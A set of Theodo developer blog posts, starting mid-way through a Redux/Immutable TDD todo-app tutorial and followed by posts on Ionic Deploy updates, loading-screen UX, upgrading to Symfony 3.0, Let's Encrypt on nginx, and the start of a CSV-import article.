      {id: 3, text: 'Immutable', status: 'active', editing: false},
    ],
    filter: 'all'
  }
}

This action will be dispatched to a reducer, whose role will be to identify it and implement the actual logic associated with the action.
In our case, the logic will be to save the new state inside the store, so that it can be propagated through our app.
Let’s write the unit tests for our reducer:
test/reducer_spec.js
import {List, Map, fromJS} from 'immutable';
import {expect} from 'chai';

import reducer from '../src/reducer';

describe('reducer', () => {

  it('handles SET_STATE', () => {
    const initialState = Map();
    const action = {
      type: 'SET_STATE',
      state: Map({
        todos: List.of(
          Map({id: 1, text: 'React', status: 'active'}),
          Map({id: 2, text: 'Redux', status: 'active'}),
          Map({id: 3, text: 'Immutable', status: 'completed'})
        )
      })
    };

    const nextState = reducer(initialState, action);

    expect(nextState).to.equal(fromJS({
      todos: [
        {id: 1, text: 'React', status: 'active'},
        {id: 2, text: 'Redux', status: 'active'},
        {id: 3, text: 'Immutable', status: 'completed'}
      ]
    }));
  });

});

We would also like, for convenience, to write the state object in plain JS instead of using Immutable data structures – and let our reducer handle the conversion. Finally, the reducer should handle an undefined initial state gracefully:
test/reducer_spec.js
// ...
describe('reducer', () => {
  // ...
  it('handles SET_STATE with plain JS payload', () => {
    const initialState = Map();
    const action = {
      type: 'SET_STATE',
      state: {
        todos: [
          {id: 1, text: 'React', status: 'active'},
          {id: 2, text: 'Redux', status: 'active'},
          {id: 3, text: 'Immutable', status: 'completed'}
        ]
      }
    };
    const nextState = reducer(initialState, action);
    expect(nextState).to.equal(fromJS({
      todos: [
        {id: 1, text: 'React', status: 'active'},
        {id: 2, text: 'Redux', status: 'active'},
        {id: 3, text: 'Immutable', status: 'completed'}
      ]
    }));
  });

  it('handles SET_STATE without initial state', () => {
    const action = {
      type: 'SET_STATE',
      state: {
        todos: [
          {id: 1, text: 'React', status: 'active'},
          {id: 2, text: 'Redux', status: 'active'},
          {id: 3, text: 'Immutable', status: 'completed'}
        ]
      }
    };
    const nextState = reducer(undefined, action);
    expect(nextState).to.equal(fromJS({
      todos: [
        {id: 1, text: 'React', status: 'active'},
        {id: 2, text: 'Redux', status: 'active'},
        {id: 3, text: 'Immutable', status: 'completed'}
      ]
    }));
  });
});

Our reducer will match the type of incoming actions, and if the type is SET_STATE, will merge the current state (in this case, the inital state) with the one in the payload:
src/reducer.js
import {Map} from 'immutable';

function setState(state, newState) {
  return state.merge(newState);
}

export default function(state = Map(), action) {
  switch (action.type) {
    case 'SET_STATE':
      return setState(state, action.state);
  }
  return state;
}

We now have to wire up the reducer with our app, so that when the app launches the initial state is set up using our action. This is actually our first call to the Redux library, so we have to install it as well:
npm install --save redux@3.3.1 react-redux@4.4.1

src/index.jsx
import React from 'react';
import ReactDOM from 'react-dom';
import {List, Map} from 'immutable';
import {createStore} from 'redux';
import {Provider} from 'react-redux';
import reducer from './reducer';
import {TodoAppContainer} from './components/TodoApp';

// We instantiate a new Redux store
const store = createStore(reducer);
// We dispatch the SET_STATE action holding the desired state
store.dispatch({
  type: 'SET_STATE',
  state: {
    todos: [
      {id: 1, text: 'React', status: 'active', editing: false},
      {id: 2, text: 'Redux', status: 'active', editing: false},
      {id: 3, text: 'Immutable', status: 'active', editing: false},
    ],
    filter: 'all'
  }
});

require('../node_modules/todomvc-app-css/index.css');

ReactDOM.render(
  // We wrap our app in a Provider component to pass the store down to the components
  <Provider store={store}>
    <TodoAppContainer />
  </Provider>,
  document.getElementById('app')
);

If you look closely to the previous code snippet, you may notice how the TodoApp component was substituded by TodoAppContainer. In Redux, there are two types of components: Presentational and Container. I encourage you to read this highly informative article by Dan Abramov that highlights the difference between the two.
If I were to sum it up quickly, I would quote the Redux docs:
“Presentational components are about how things look (styles and templates) and Container components are about how things work (data fetching, state updates).”
Okay, so we have our store set up and passed down at our TodoAppContainer component. However, in order for our child component to make sense of the store, we have to map the state attributes to React props for the TodoApp component – that is what gives us the TodoAppContainer:
src/components/TodoApp.jsx
// ...
import {connect} from 'react-redux';

export class TodoApp extends React.Component {
// ...
}
function mapStateToProps(state) {
  return {
    todos: state.get('todos'),
    filter: state.get('filter')
  };
}

export const TodoAppContainer = connect(mapStateToProps)(TodoApp);

If you reload your app in the browser, you should see it initialized like before – except now it’s using Redux tools.
The Redux dev tools
Note: here is the relevant commit in the companion repository.
Now that we have a Redux store and reducer set up, we can set up the Redux dev tools for a streamlined development experience.
First, go and grab the Redux dev tools Chrome extension.
The dev tools are enabled at the time of the store creation, in index.jsx:
src/index.jsx
// ...
import {compose, createStore} from 'redux';

const createStoreDevTools = compose(
  window.devToolsExtension ? window.devToolsExtension() : f => f
)(createStore);
const store = createStoreDevTools(reducer);
// ...


Reload the app in your browser and click on the Redux icon in the dev tools: here they are!
Three different monitors are available out of the box: the Diff Monitor, the Log Monitor and the Slider Monitor (the one I talked about in part one). Feel free to play around with them 
Setting up our actions with Action Creators
Toggling the status of an item
Note: here is the relevant commit in the companion repository.
The next step is to allow the user to toggle the status of todos, between active and completed.
First, the reducer have to handle a new action, TOGGLE_COMPLETE, whose requirements will be to change the status between active and completed:
test/reducer_spec.js
import {List, Map, fromJS} from 'immutable';
import {expect} from 'chai';

import reducer from '../src/reducer';

describe('reducer', () => {
// ...
  it('handles TOGGLE_COMPLETE by changing the status from active to completed', () => {
    const initialState = fromJS({
      todos: [
        {id: 1, text: 'React', status: 'active'},
        {id: 2, text: 'Redux', status: 'active'},
        {id: 3, text: 'Immutable', status: 'completed'}
      ]
    });
    const action = {
      type: 'TOGGLE_COMPLETE',
      itemId: 1
    }
    const nextState = reducer(initialState, action);
    expect(nextState).to.equal(fromJS({
      todos: [
        {id: 1, text: 'React', status: 'completed'},
        {id: 2, text: 'Redux', status: 'active'},
        {id: 3, text: 'Immutable', status: 'completed'}
      ]
    }));
  });

  it('handles TOGGLE_COMPLETE by changing the status from completed to active', () => {
    const initialState = fromJS({
      todos: [
        {id: 1, text: 'React', status: 'active'},
        {id: 2, text: 'Redux', status: 'active'},
        {id: 3, text: 'Immutable', status: 'completed'}
      ]
    });
    const action = {
      type: 'TOGGLE_COMPLETE',
      itemId: 3
    }
    const nextState = reducer(initialState, action);
    expect(nextState).to.equal(fromJS({
      todos: [
        {id: 1, text: 'React', status: 'active'},
        {id: 2, text: 'Redux', status: 'active'},
        {id: 3, text: 'Immutable', status: 'active'}
      ]
    }));
  });
});

In order to make the test pass, we can update the reducer:
src/reducer.js
// ...
function toggleComplete(state, itemId) {
  // We find the index associated with the itemId
  const itemIndex = state.get('todos').findIndex(
    (item) => item.get('id') === itemId
  );
  // We update the todo at this index
  const updatedItem = state.get('todos')
    .get(itemIndex)
    .update('status', status => status === 'active' ? 'completed' : 'active');

  // We update the state to account for the modified todo
  return state.update('todos', todos => todos.set(itemIndex, updatedItem));
}

export default function(state = Map(), action) {
  switch (action.type) {
    case 'SET_STATE':
      return setState(state, action.state);
    case 'TOGGLE_COMPLETE':
      return toggleComplete(state, action.itemId);
  }
  return state;
}

In the same vein as the SET_STATE action, we need to make the TodoAppContainer component aware of this action, so that the toggleComplete callback will be passed down to the TodoItem component (the one that actually makes the call).
In Redux, there is a standard way to do just that: Action Creators.
Action creators are simply functions that return the properly formatted action – and these functions are the ones that are mapped to React props.
Let’s create our first action creator:
src/action_creators.js
export function toggleComplete(itemId) {
  return {
    type: 'TOGGLE_COMPLETE',
    itemId
  }
}

Now, through a call to the connect function in the TodoAppContainer component that we already used for fetching the store, we are telling the component to map its props callbacks to the action creators of the same name:
src/components/TodoApp.jsx
// ...
import * as actionCreators from '../action_creators';
export class TodoApp extends React.Component {
  // ...
  render() {
    return <div>
      // ...
        // We use the spread operator for better lisibility
        <TodoList  {...this.props} />
      // ...
    </div>
  }
};

export const TodoAppContainer = connect(mapStateToProps, actionCreators)(TodoApp);

Restart your web server and refresh your browser: tada! A click on an item now properly toggles its state. And if you look in the Redux dev tools, you can see the action being triggered and the subsequent state update.
Changing the current filter
Note: here is the relevant commit in the companion repository.
Now that everything is set up, writing up our other actions will be a breeze. We will continue withe the CHANGE_FILTER action that will, you guessed it, change the current filter in the state and thus display only the filtered items.
We start by writing our action creator:
src/action_creators.js
// ...
export function changeFilter(filter) {
  return {
    type: 'CHANGE_FILTER',
    filter
  }
}

Now we write the unit tests for the reducer:
test/reducer_spec.js
// ...
describe('reducer', () => {
  // ...
  it('handles CHANGE_FILTER by changing the filter', () => {
    const initialState = fromJS({
      todos: [
        {id: 1, text: 'React', status: 'active'},
      ],
      filter: 'all'
    });
    const action = {
      type: 'CHANGE_FILTER',
      filter: 'active'
    }
    const nextState = reducer(initialState, action);
    expect(nextState).to.equal(fromJS({
      todos: [
        {id: 1, text: 'React', status: 'active'},
      ],
      filter: 'active'
    }));
  });
});

And we write the associated reducer function:
src/reducer.js
// ...
function changeFilter(state, filter) {
  return state.set('filter', filter);
}

export default function(state = Map(), action) {
  switch (action.type) {
    case 'SET_STATE':
      return setState(state, action.state);
    case 'TOGGLE_COMPLETE':
      return toggleComplete(state, action.itemId);
    case 'CHANGE_FILTER':
      return changeFilter(state, action.filter);
  }
  return state;
}

Lastly, we need to pass down the changeFilter callback to the TodoTools component:
TodoApp.jsx
// ...
export class TodoApp extends React.Component {
  // ...
  render() {
    return <div>
      <section className=""todoapp"">
        // ...
        <TodoTools changeFilter={this.props.changeFilter}
                   filter={this.props.filter}
                   nbActiveItems={this.getNbActiveItems()} />
      </section>
      <Footer />
    </div>
  }
};

And that’s it! The filter selector works perfectly 
Item editing
Note: here is the relevant commit in the companion repository.
When the user edits an item, there are actually two actions triggered out of three possible:

The user enters the editing mode: EDIT_ITEM;
The user cancels the editing mode (changes are not saved): CANCEL_EDITING;
The user validates her edition (changes are saved): DONE_EDITING

We can write the action creators for the three actions:
src/action_creators.js
// ...
export function editItem(itemId) {
  return {
    type: 'EDIT_ITEM',
    itemId
  }
}

export function cancelEditing(itemId) {
  return {
    type: 'CANCEL_EDITING',
    itemId
  }
}

export function doneEditing(itemId, newText) {
  return {
    type: 'DONE_EDITING',
    itemId,
    newText
  }
}

Now we can write the unit tests for each of these actions:
test/reducer_spec.js
// ...
describe('reducer', () => {
  // ...
  it('handles EDIT_ITEM by setting editing to true', () => {
    const initialState = fromJS({
      todos: [
        {id: 1, text: 'React', status: 'active', editing: false},
      ]
    });
    const action = {
      type: 'EDIT_ITEM',
      itemId: 1
    }
    const nextState = reducer(initialState, action);
    expect(nextState).to.equal(fromJS({
      todos: [
        {id: 1, text: 'React', status: 'active', editing: true},
      ]
    }));
  });

  it('handles CANCEL_EDITING by setting editing to false', () => {
    const initialState = fromJS({
      todos: [
        {id: 1, text: 'React', status: 'active', editing: true},
      ]
    });
    const action = {
      type: 'CANCEL_EDITING',
      itemId: 1
    }
    const nextState = reducer(initialState, action);
    expect(nextState).to.equal(fromJS({
      todos: [
        {id: 1, text: 'React', status: 'active', editing: false},
      ]
    }));
  });

  it('handles DONE_EDITING by setting by updating the text', () => {
    const initialState = fromJS({
      todos: [
        {id: 1, text: 'React', status: 'active', editing: true},
      ]
    });
    const action = {
      type: 'DONE_EDITING',
      itemId: 1,
      newText: 'Redux',
    }
    const nextState = reducer(initialState, action);
    expect(nextState).to.equal(fromJS({
      todos: [
        {id: 1, text: 'Redux', status: 'active', editing: false},
      ]
    }));
  });
});

And we can now develop the reducer functions that will actually handle the three actions:
src/reducer.js
function findItemIndex(state, itemId) {
  return state.get('todos').findIndex(
    (item) => item.get('id') === itemId
  );
}

// We can refactor the toggleComplete function to use findItemIndex
function toggleComplete(state, itemId) {
  const itemIndex = findItemIndex(state, itemId);
  const updatedItem = state.get('todos')
    .get(itemIndex)
    .update('status', status => status === 'active' ? 'completed' : 'active');

  return state.update('todos', todos => todos.set(itemIndex, updatedItem));
}

function editItem(state, itemId) {
  const itemIndex = findItemIndex(state, itemId);
  const updatedItem = state.get('todos')
    .get(itemIndex)
    .set('editing', true);

  return state.update('todos', todos => todos.set(itemIndex, updatedItem));
}

function cancelEditing(state, itemId) {
  const itemIndex = findItemIndex(state, itemId);
  const updatedItem = state.get('todos')
    .get(itemIndex)
    .set('editing', false);

  return state.update('todos', todos => todos.set(itemIndex, updatedItem));
}

function doneEditing(state, itemId, newText) {
  const itemIndex = findItemIndex(state, itemId);
  const updatedItem = state.get('todos')
    .get(itemIndex)
    .set('editing', false)
    .set('text', newText);

  return state.update('todos', todos => todos.set(itemIndex, updatedItem));
}

export default function(state = Map(), action) {
  switch (action.type) {
    // ...
    case 'EDIT_ITEM':
      return editItem(state, action.itemId);
    case 'CANCEL_EDITING':
      return cancelEditing(state, action.itemId);
    case 'DONE_EDITING':
      return doneEditing(state, action.itemId, action.newText);
  }
  return state;
}

Aaaand it works like a charm in your browser 
Clearing completed, adding and deleting items
Note: here is the relevant commit in the companion repository.
Our three remaining actions are the following:

CLEAR_COMPLETED, that is triggered in the TodoTools component and clears completed items from the list;
ADD_ITEM, that is triggered in the TodoHeader component and add an item with the text entered by the user;
DELETE_ITEM, that is called from TodoItem and deletes an item

We are now used to the workflow: add the action creators, unit test the reducer and code the logic, and eventually pass down the callback as props:
src/action_creators.js
// ...
export function clearCompleted() {
  return {
    type: 'CLEAR_COMPLETED'
  }
}

export function addItem(text) {
  return {
    type: 'ADD_ITEM',
    text
  }
}

export function deleteItem(itemId) {
  return {
    type: 'DELETE_ITEM',
    itemId
  }
}

test/reducer_spec.js
// ...
describe('reducer', () => {
  // ...
  it('handles CLEAR_COMPLETED by removing all the completed items', () => {
    const initialState = fromJS({
      todos: [
        {id: 1, text: 'React', status: 'active'},
        {id: 2, text: 'Redux', status: 'completed'},
      ]
    });
    const action = {
      type: 'CLEAR_COMPLETED'
    }
    const nextState = reducer(initialState, action);
    expect(nextState).to.equal(fromJS({
      todos: [
        {id: 1, text: 'React', status: 'active'},
      ]
    }));
  });

  it('handles ADD_ITEM by adding the item', () => {
    const initialState = fromJS({
      todos: [
        {id: 1, text: 'React', status: 'active'}
      ]
    });
    const action = {
      type: 'ADD_ITEM',
      text: 'Redux'
    }
    const nextState = reducer(initialState, action);
    expect(nextState).to.equal(fromJS({
      todos: [
        {id: 1, text: 'React', status: 'active'},
        {id: 2, text: 'Redux', status: 'active'},
      ]
    }));
  });

  it('handles DELETE_ITEM by removing the item', () => {
    const initialState = fromJS({
      todos: [
        {id: 1, text: 'React', status: 'active'},
        {id: 2, text: 'Redux', status: 'completed'},
      ]
    });
    const action = {
      type: 'DELETE_ITEM',
      itemId: 2
    }
    const nextState = reducer(initialState, action);
    expect(nextState).to.equal(fromJS({
      todos: [
        {id: 1, text: 'React', status: 'active'},
      ]
    }));
  });
});

src/reducer.js
function clearCompleted(state) {
  return state.update('todos',
    (todos) => todos.filterNot(
      (item) => item.get('status') === 'completed'
    )
  );
}

function addItem(state, text) {
  const itemId = state.get('todos').reduce((maxId, item) => Math.max(maxId,item.get('id')), 0) + 1;
  const newItem = Map({id: itemId, text: text, status: 'active'});
  return state.update('todos', (todos) => todos.push(newItem));
}

function deleteItem(state, itemId) {
  return state.update('todos',
    (todos) => todos.filterNot(
      (item) => item.get('id') === itemId
    )
  );
}

export default function(state = Map(), action) {
  switch (action.type) {
    // ...
    case 'CLEAR_COMPLETED':
      return clearCompleted(state);
    case 'ADD_ITEM':
      return addItem(state, action.text);
    case 'DELETE_ITEM':
      return deleteItem(state, action.itemId);
  }
  return state;
}

src/components/TodoApp.jsx
// ...
export class TodoApp extends React.Component {
  // ...
  render() {
    return <div>
      <section className=""todoapp"">
        // We pass down the addItem callback
        <TodoHeader addItem={this.props.addItem}/>
        <TodoList {...this.props} />
        // We pass down the clearCompleted callback
        <TodoTools changeFilter={this.props.changeFilter}
                    filter={this.props.filter}
                    nbActiveItems={this.getNbActiveItems()}
                    clearCompleted={this.props.clearCompleted}/>
      </section>
      <Footer />
    </div>
  }
};

Our TodoMVC app is now complete!
Wrapping up
This concludes our TDD tutorial on the React, Redux & Immutable stack.
There are however plenty more things to dig if you want to go further, such as:

React Redux router to build complete Single Page Applications
Isomorphic Redux for using Redux in the backend, which is extensively covered in these two tutorials
Gambit, a small wrapper around Redux to simplify the connections to APIs
This free series of videos by Dan Abramov (Redux’s creator!) that cover a lot of Redux, in more depth than this article, with excellent pedagogy
And much more available on the Redux website!


										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Nicolas Goutay
  			
  				Webdeveloper at Theodo. Webdesign & UX enthusiast.  			
  		
    
			

									"
"
										If you love hybrid mobile development, it’s probably because you are also really fond of web development.
One of the reasons is likely that you’re always certain that users are getting the latest version you deployed.
Hybrid mobile development sure is moving fast, but this was made possible only a few months ago, thanks to
Ionic Deploy, one of the greatest features of Ionic.io. Before, you had to wait up to two weeks for Apple to approve each update. Here’s how you can get those out there with a single command.
Creating your app
Creating an Ionic app is dead easy. Start by signing up on Ionic.io and get ready to code.
I’m calling my app updaty but please do pick your own name.
npm install -g cordova ionic
ionic start updaty tabs
cd updaty
ionic add ionic-platform-web-client
ionic io init
ionic plugin add ionic-plugin-deploy

Guess what? You already have an app using a basic tabs template and it’s already hooked up with Ionic.io services, including Ionic Deploy. You can get some information about your application on the Ionic.io Dashboard where your app should now be listed.
Ionic View
Ionic View allows you to very quickly get testers or clients to use your application. Just run ionic upload and anyone having your credentials or who was invited through the “Settings->Collaborators” section of the dashboard will be able to try out your app using the Ionic View app, available on the App Store and Google Play Store.
Here’s the catch : only a few cordova plugins will work, and you will not always have the same behavior than your application once it gets in production. I highly recommend it when starting out if you want to quickly show features to your client, but start working on getting a real application provisionned, for instance to follow the rest of the tutorial.
Ionic Deploy
Let’s get serious. Let’s say you’ve got the actual application on your phone, maybe even in production and let’s also say you really like agile development and you don’t want users to have to download a new version to get all the features you want to put daily in production.
Ionic Deploy gives you quite a few possibilities on how you want to handle the updating of your application, which always requires a restart when over.
My recommandation is to always download the latest version on the background, but not to restart the app immediately, so that :

The user can use your app while the update is being downloaded
The user can dismiss the restart if he/she is busy using your app

Fetching updates
Here is how I fetch updates, with the help of $ionicPopup in order to give the possibility of dismissing the restart of the app.
.run(function($ionicPopup) {
  var deploy = new Ionic.Deploy();
  deploy.watch().then(function() {}, function() {}, function(updateAvailable) {
    if (updateAvailable) {
      deploy.download().then(function() {
        deploy.extract().then(function() {
          deploy.unwatch();
          $ionicPopup.show({
            title: 'Update available',
            subTitle: 'An update was just downloaded. Would you like to restart your app to use the latest features?',
            buttons: [
              { text: 'Not now' },
              {
                text: 'Restart',
                onTap: function(e) {
                  deploy.load();
                }
              }
            ]
          });
        });
      });
    }
  });
};


watch takes as a third argument a progress function, which gets called every minute to check for updates. That way, a new update can be fetched even if the user never closes the application. We want to start watching as soon as the app starts, hence putting all of this in a run block. This check is done in the background and asynchronously, which means that there is no impact on the performance of the application.
download downloads the latest update into your device.
extract extracts it.
Once the update is extracted, it is applied to your application the next time it gets restarted;
unwatch gets called because we want to stop trying to fetch new updates, until the user has chosen to restart the app now or later.
load restarts the app immediately and gets called only if the user taps on the “Restart” button.

Pushing updates
Only one command is needed, and you already know it! That’s right, I’m talking about ionic upload!
On your (now very familiar) Ionic.io Dashboard, you can get on the “Deploy” section all the updates you deployed, and have the possibility to rollback to an older version if you made a mistake! Oops!
What’s next?
In part 2, we see how we can handle multiple environments by having several versions of your app (staging, preprod, prod for instance) with a single codebase, and getting environment specific updates using gulp, a few gulp plugins, and Ionic Deploy.

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Woody Rousseau
  			
  				Woody is a full-stack web developer, who believes in building complex applications, with a focus on speed without compromising code quality. He also loves adding  as many Github badges as possible on his repositories.  			
  		
    
			

									"
"
										29th October 2015, Amsterdam, Netherlands @Velocity Conf
At the last VelocityConf (http://velocityconf.com/devops-web-performance-eu-2015) in Amsterdam, we attended a very interesting talk about waiting phases. 
You have an app. Everything works, but it’s slow and users are bored and some even leave. You can do a lot of things, but once you have used all your tips and tricks to speed up interface loading, rendering, and keeping it fluent and it’s still not enough, you have to ask yourself : what else can I do? What kind of magic tricks can I, as a developer, device to keep the user busy and make cool animations at the same time?
It’s a very challenging mission to keep the user’s attention focused during waiting phases (loading mainly). The technical team has to make the Product Owner aware of the importance of those phases. Another advice will be to work with UX/UI designers to get innovative inputs. These designers have another vision of web interfaces and can help you to find the right animation or sentence that will make your loading phase captivating.
Here are some frequent solutions that are disappointing in my opinion :
Have blank blocks or entire blank pages during loading. Instead, display at least your logo to replace blank pages.

Display spinners during the whole loading period: users will think it’s slow.
 

So to avoid these old and sticky loaders and to create your first “fun” loading phase, here are some tips:
 
Adding an engaging text can help: to “find fun”. 

Create animations during page loading. For example, you can use the seagull effect: it’s going somewhere unlike a spinner. It’s a very easy way to transform a boring loader into a funny animation.

Use fake layouts without datas to make transitions more fluent. 

Use specific and lite modules: display some news about your application, the company or anything else.
These websites are a great source of inspiration: 

http://designmodo.com/free-preloaders-spinners/
http://codepen.io/collection/HtAne/

 
Testimonial from Raphaël, an experienced Theodoer who had to face the situation in real life
We were building an app for a bank, but it wasn’t responding as fast as expected. Once, the beta testers even told us they thought the app was broken. First, we worked for three entire days on optimizing the backend, and managed to cut loading times by half. However, it wasn’t satisfactory enough and we had no time left before launch. We decided to include the please-wait.js library in our app : https://pathgather.github.io/please-wait/. It shows a splash page while your application loads. We managed to plug it on the onRouteChange angularJS event, to make the splash screen pop out on each angular route change. This is actually the most efficient optimisation we made. We managed to wipe out the feeling of having a slow application in no more than an hour of coding. Nobody told us it was slow ever since.
 
The lesson is : keep your user busy instead of just asking him to be patient. He’ll be grateful!
Sources:
Jean-Pierre Vincent, Fake it until you make it: Interface design to the rescue of performance, speak @VelocityConf 2015 in Amsterdam

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Nicolas Boutin
  			
  				Nicolas is a former entrepreneur and a web agile developer. After making all the mistakes launching his first startup in SME's digital transformation he joined Theodo to learn how to build web and mobile applications keeping customers satisfied. Symfony + APIPlatform + React is his favorite stack to develop fast and easy to maintain app. He's still eager to start a new venture.  			
  		
    
			

									"
"
										A new major version is always exciting: when it comes to one of our favorite frameworks like Symfony, it’s Christmas come early for developers. But is is also worrisome. Will my application break? Will I have to rewrite half of my code? Don’t panic! We will go through the 3.0 major version changes and cover various subjects from new features to upgrading.
What’s up doc?
To be honest, there is no new shiny feature in this version.
What? You said Symfony 3.0 was awesome!
Yeah, Symfony 3.0 is awesome exactly because of that.
Let’s go back to one rule of semantic versioning:
Major version X (X.y.z | X > 0) MUST be incremented if any backwards incompatible changes are introduced.
As a consequence, Symfony 3.0 is allowed to break compatibility. It does little else. And this is necessary: at some point, you need to clean the compatibility layers burdening your framework. But to avoid most of the pain, the Symfony developers used a well designed release schedule:

Major features were introduced in 2.7 and 2.8 (which was released at the same time as 3.0)
2.7 and 2.8 are backward compatible
Since 2.6 users are notified about deprecated methods when they are used
All compatibility layers are dropped in the 3.0 version

If you are interested in shiny features and have not moved to 2.7 yet, you might want to read this:

New features in 2.7
New features in 2.8

The framework has become more standard (support of the PSR-3 standard for logging), has got rid of some architecture mistakes and is more decoupled and reusable than ever. Here are the notable changes:
A new directory structure
Basically, the entire structure of Symfony didn’t change but there were some tweaks:
2.5 directory structure | 3.0 directory structure
app/cache               | var/cache
app/logs                | var/log
app/bootstrap.php.cache | var/bootstrap.php.cache
app/console             | bin/console
app/phpunit.xml.dist    | phpunit.xml.dist

As a result, you can run PHPUnit without specifying a config file: phpunit instead of phunit -c app. All binaries are moved into the bin directory and the new var directory was made for easier permission settings (the entire directory should be writable).
New components
The Asset component was introduced in 2.7 and automatically manages URL generation and versioning of your stylesheets, javascript files and images.
The LDAP component was introduced in 2.8 and allows you to use an LDAP service as a security provider.
A PHPUnit bridge was added in 2.7. Its main advantage is that use of depreciated code is reported and tests will fail because of that. With this bridge it will be easier for you to stay up to date.
Profiler improvements
The Twig and Translation profilers were added. Furthermore, the whole debug interface was redesigned to have a nicer look and a better user experience.


How to upgrade to 3.0
First of all, PHP 5.5 is the new required version to run Symfony 3.0. Check that your servers are running 5.5 or newer PHP versions, if not consider upgrading PHP.
Now, you need to check the migration status of installed bundles. Here is a Google Doc summing up migration statuses of major bundles.
As for the code itself, this is the easiest part. And you should do it even if you don’t meet the above requirements because 2.7 and 2.8 came with great performance and security improvements. Updating to a new LTS (Long Term Support) version when it comes out (2.8) is also a good practice for maintainability.
A method that should work in most cases:

Update to 2.8.X. There is no compatibility breaks in minor versions, so your website will still be running.
Quickly install the Deprecation Detector utility.
Run deprecation-detector check in your Symfony app. It will list all deprecated methods and classes with a hint on how to fix the issue.
If you need more details you can check the full UPGRADE guide.


What’s next?
Be careful though, the 3.0 version is not an LTS one. The last LTS version is 2.8 and the next one is the 3.3 to be released in May 2017.
Concerning PHP7 (this is a great month for PHP lovers), Symfony will not move to this version yet, but a bump to PHP 5.6 next year is being considered.
As 3.0 is not that a revolution (but a needed cleaning process), development will continue normally in the next months to come.
Conclusion
Even if you don’t upgrade now (but you really should), you can move to 2.8 which is an LTS and have warnings about deprecated methods that are removed from the 3.0 version.
Migration from Symfony 1 to Symfony 2 was (and still is) a terrifying journey. With the Backwards Compatibility Promise, the Symfony development team wanted to build a more lasting framework and produced a nice and smooth migration process for 3.0.
The official blog post
You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us
 

										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Albéric Trancart
  			
  				Albéric Trancart is an agile web developer at Theodo. He loves sharing what he has learnt and exchanging with great people.  			
  		
    
			

									"
"
										To celebrate this, I will guide you through the 6 steps required to get an auto-hosted, HTTPS website. With its own TLD domain. For free. Yeah!
It should take a few minutes of your time. We will only be using free services. It will also allow you to try the https://letsencrypt.org initiative on an Nginx server.
Step 1:
There are some services that allow you to register domains for free:

http://noip.com
http://dyndns.org
http://registry.cu.cc

Unfortunately, it will not work with these domains. Let’s encrypt is currently limiting the number of certificates issued per top domain (*.noip.me, *.cu.cc…), and you will most likely not be the first one on these domains.
The solution I found is to use http://freenom.com which offer free TLDs (.ga, .ml…): it works, but I would only use it for personal use.
Choose your domain name, and enter your DNS records.

 
Step 2:
I will assume for all the following commands that you are using a Debian based distribution, but you can easily find documentation for your favorite distro.
Boot up your Raspberry pi or whatever server you will be using to host your website, SSH to it, and install Nginx:
user@webserver:~$ sudo apt-get update && sudo apt-get upgrade
user@webserver:~$ sudo apt-get install nginx
user@webserver:~$ sudo /etc/init.d/nginx start

Test the default, local website: http://my.rpi.local.ip
If you do not know Nginx or want to know more, Maxime wrote a nice article about the basics of nginx.
Step 3 (optional):
Write a website. Easiest step ever.

Or you can just use the default website, nobody is judging you…
Step 4:
Edit the nginx configuration file for your website.
user@webserver:~$ sudo vim /etc/nginx/sites-available/default

Listen on the server name you registered earlier: server_name myhostname.ga
Save, restart nginx: sudo /etc/init.d/nginx restart
Step 5:
In your router, add a static route for your server, open ports 80 and 443 and redirect them to your internal ip.

Try the HTTP website on the public domain you registered earlier:
http://myhostname.go. If you get an answer, you are good to go. If not, wait longer for the DNS redirection to propagate.
Step 6: Let the magic begin!

First, install the letsencrypt cli on your webserver.
user@webserver:~$ git clone https://github.com/letsencrypt/letsencrypt
user@webserver:~$ cd letsencrypt

Enabling Nginx plugin
As Nginx is not yet supported, you have to enable it manually. If you use Apache, this step is not required.
user@webserver:~/letsencrypt$ vim bootstrap/venv.sh

Find line
$VENV_BIN/pip install -U -r py26reqs.txt letsencrypt letsencrypt-apache # letsencrypt-nginx

and uncomment letsencrypt-nginx. It becomes:
$VENV_BIN/pip install -U -r py26reqs.txt letsencrypt letsencrypt-apache letsencrpyt-nginx

Generate first certificate!
You are now ready to obtain your first Let’s encrypt certificate. We will use the default command, with the debug, verboseand nginx flags enabled:
user@webserver:~/letsencrypt$ ./letsencrypt-auto --nginx --debug --verbose

And just follow the wizard…

Result
Go visit your website again, only this time, hit the https endpoint.


(Very light) Troubleshooting

If you have an error when signing your certificate request:
Error: urn:acme:error:rateLimited:: There were too many requests of a given type:: Error creating new cert:: Too many certificates already issued for: noip.me/cu.cc/…

you probably missed the line in step 1:
Unfortunately, it will not work with these domains.
Buy a domain or find another one!
Conclusion
Let’s encrypt is in very early development phase for nginx, and not really supported at the moment. The script updates /var/nginx/nginx.conf with the required configuration. Still, you can access the generated keys and certificates:

/etc/letsencrypt/live/<domain name>/privkey.pem
/etc/letsencrypt/live/<domain name>/fullchain.pem

You are obviously free to use these certificates any way you want and edit the nginx configuration files. However, these certificates are only valid for 3 months. The main idea behind Let’s encrypt is to automate the generation of certificates.
The automation step seems ready for Apache (you add a cronjob calling letsencrypt-auto and that’s it, your certificates get updated), but not quite yet for Nginx. If you want to use the automatic renewal, you probably will have to keep the configuration files untouched.
However, a number of projects are starting to appear. For instance, a Docker Let’s Encrypt companion container for nginx-proxy was shared some days ago by the docker team, or Synology announced they will soon integrate Let’s Encrypt in the DiskStation Manager.
Links

https://www.theodo.fr/blog/2014/08/learn-the-basics-of-nginx/
https://letsencrypt.org/
https://letsencrypt.readthedocs.org/
https://github.com/letsencrypt/letsencrypt
http://freenom.com


										You liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us

										
	WRITTEN BY

	
		    
  		
  			
  				  			
  		

  		
				Kevin Raynel
  			
  				Developer at Theodo.  			
  		
    
			

									"
"
										When you build an app where users need to regularly import data from an external source, you are bound to import csv files to populate your database.
Often referred as ETL (Extract, Transform and Load), these functionalities are tricky to implement and often hard to understand for the end user. This article explains how to tackle the main challenges of csv import and provides a fully functional repo on github to get started quickly on a project!
